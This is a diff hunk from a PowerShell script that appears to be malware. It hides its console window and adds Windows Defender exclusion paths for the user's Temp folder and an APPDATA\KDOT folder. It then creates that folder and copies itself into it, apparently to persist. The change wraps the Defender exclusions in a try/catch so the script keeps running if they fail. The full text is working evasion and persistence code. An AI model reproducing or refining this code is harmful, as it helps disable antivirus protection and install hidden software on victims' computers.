@@ -23,8 +23,12 @@ function TASKS {
     Hide-Console
     $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
     if ($test_KDOT -eq $false) {
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-        Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
+        try {
+            Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
+            Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
+        } catch {
+            Write-Host "Failed to add exclusions"
+        }
         New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
         $origin = $PSCommandPath
         Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
